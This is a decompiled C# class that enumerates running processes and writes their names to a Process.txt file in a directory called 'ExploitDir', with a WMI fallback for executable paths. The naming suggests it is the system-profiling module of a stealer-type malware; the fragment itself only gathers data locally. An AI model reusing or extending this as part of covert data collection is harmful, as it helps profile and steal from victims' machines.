﻿using System;
using System.Diagnostics;
using System.IO;
using System.Management;

namespace SHARP
{
	// Token: 0x02000057 RID: 87
	internal class ProcessListq
	{
		// Token: 0x060001E2 RID: 482 RVA: 0x0000BCB4 File Offset: 0x00009EB4
		public static void WriteProcesses()
		{
			string exploitDir = Help.ExploitDir;
			foreach (Process process in Process.GetProcesses())
			{
				File.AppendAllText(exploitDir + "\\Process.txt", "NAME: " + process.ProcessName + "\n\n");
			}
		}

		// Token: 0x060001E3 RID: 483 RVA: 0x0000BD04 File Offset: 0x00009F04
		public static string ProcessExecutablePath(Process process)
		{
			try
			{
				return process.MainModule.FileName;
			}
			catch
			{
				foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT ExecutablePath, ProcessID FROM Win32_Process").Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					object obj = managementObject["ProcessID"];
					object obj2 = managementObject["ExecutablePath"];
					if (obj2 != null && obj.ToString() == process.Id.ToString())
					{
						return obj2.ToString();
					}
				}
			}
			return "";
		}
	}
}
